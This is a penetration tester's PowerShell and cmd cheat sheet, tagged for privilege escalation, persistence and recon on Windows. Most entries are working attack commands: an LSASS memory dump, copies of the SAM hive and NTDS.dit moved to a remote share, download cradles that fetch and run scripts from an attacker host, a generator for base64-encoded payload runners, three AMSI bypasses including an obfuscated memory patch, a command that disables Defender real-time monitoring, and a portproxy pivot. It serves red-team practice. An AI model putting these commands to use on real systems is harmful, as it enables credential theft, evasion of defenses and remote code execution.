# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Powershell - List running processes
```
tasklist /svc
```
## Powershell - Search for "password" in files
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Display LSASS process information
```
Get-Process lsass
```

## Create LSASS memory dump
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## reg.exe - Save a copy of a registry hive
```
reg.exe save hklm\sam C:\sam.save
```

## regsvr32 - Register DLL
```
regsvr32.exe SocksOverRDP-Plugin.dll
```

## Transfer file to a file share
```
move sam.save \\<ip>\NameofFileShare
```

## cmd.exe - Copy NTDS.dit from shadow copy
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## vssadmin - Create volume shadow copy
```
vssadmin CREATE SHADOW /For=C:
```

## Invoke-WebRequest - Download file
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Discover devices on network (Windows)
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

## PowerShell - Ping network segment
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```
## netsh - Configure portproxy rule
```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

## netsh - View portproxy rule
```
netsh.exe interface portproxy show v4tov4
```

## Download cradle
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```

## Get file in trash
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Get process
```powershell
Get-Process
```

## Get Proxy
```powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://<ip>/<url>")
```

## Get language mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

## Bypass AMSI with _amsiContext_ (powershell only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Bypass AMSI with _AmsiInitFailed_ (powershell only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Bypass AMSI by patching (work for .NET binaries too)
```powershell
// more infos here : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;

public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0

[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Verify PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```
## Verify application whitelisting
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## show forest trust
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```
## Get domain trust
```powershell
Get-DomainTrust -Domain <domain>
```

## Get domain SID
```powershell
Get-DomainSID -domain <sid>
```

## hostrecon
```
// https://github.com/dafthack/HostRecon
(new-object system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon
```

## privesccheck

```powershell
//https://github.com/itm4n/PrivescCheck
(new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
```

## powershell view assemblies
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

## powershell get proxy address
```powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

## powershell set proxy
```powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://<proxaddress|$proxyAddr>")
```

## powershell - generate base64 encoded payload download runner
#plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
```powershell
pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
```

## powershell - disable Real Time Monitoring (Windows Defender)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
